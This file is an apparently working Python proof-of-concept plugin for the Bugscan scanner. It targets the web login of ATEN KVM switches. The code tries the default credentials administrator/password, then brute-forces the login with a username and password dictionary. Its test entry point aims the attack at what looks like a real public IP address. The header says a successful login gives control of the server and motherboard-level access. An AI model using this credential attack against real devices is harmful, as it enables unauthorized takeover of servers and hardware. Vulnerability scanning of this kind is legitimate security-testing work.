#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  ATEN KVM WeakPass
Author    :  a
mail      :  a@lcx.cc
介绍   :  KVM 便携式工控交换机通过直接连接键盘、视频和鼠标 (KVM) 端口，让您能够访问和控制计算机。KVM 技术无需目标服务器修改软件。
这就意味着可以在 Windows 的 BIOS 环境下，随时访问目标计算机。KVM 提供真正的主板级别访问，并支持多平台服务器和串行设备。
危害： kvm通过https方式访问，弱口令进入后，可以控制服务器和访问主板
该插件编写过程：详见圈子 http://q.bugscan.net/t/1517
"""



import urlparse
import time
import re

def assign(service, arg):
    if service == 'ATEN KVM':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    defaultPass = ['administrator','password']
    dic = loadSDKWeakPassWd(arg)
    res ,code = weakPass(arg,defaultPass)
    if code ==0:
        return
    if 'System is authorizing user ID, Please wait' in res:
        security_hole('ATEN KVM haved Weak password username:%s ,pass:%s' % (defaultPass[0],defaultPass[1]))
    elif 'Invalid Username or Password' in res:
        security_note("please wating ,Bugscan is being attacked by a dictionary.")
        for l in dic:
            if 'System is authorizing user ID, Please wait' in weakPass(arg,l):
                 security_hole('ATEN KVM haved Weak password username:%s ,pass:%s' % (l[0],l[1]))
                 security_hole(arg)
                 return
                                 
    
def weakPass(arg,list):
    
    code, head,res, errcode, _ = curl.curl2(arg)  
    if not "System is redirecting you to an SSL port. Please wait" in res:
        return 0 ,0
    m = re.search(r"\"/(\w+)", res)
    if m:
        url = arg + m.group(1)
    else:
        return  0 ,0
    code, head,res, errcode, _ = curl.curl2(url)
    m = re.search(r"KVMIP_TARGETID\" value=\"(\w+)\"",res)
    if m:
        KVMIP_TARGETID =  m.group(1)
    else:
        return  0 ,0
    date = 'KVMIP_GMTIME=9949837368&KVMIP_LOGIN=%s+%s+%s+%s&KVMIP_TARGETID=%s' %(list[0],list[1],util.get_url_host(arg),KVMIP_TARGETID,KVMIP_TARGETID)
    arg = arg + '/KVMIP'
    code, head,res, errcode, _ = curl.curl2(arg,date)
     
    return res ,code
    

def loadSDKWeakPassWd(args):
    r = urlparse.urlparse(args)
    host = r.hostname
    sdklist = []
 
    pass_list = util.load_password_dict(
        host,
        userfile='database/http_user.txt', 
        passfile='database/http_pass.txt',
        userlist=None,
        passlist=None,
        mix=True,
        )
    sdklist = pass_list

    return sdklist
    
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('ATEN KVM', 'https://221.192.131.197/')[1])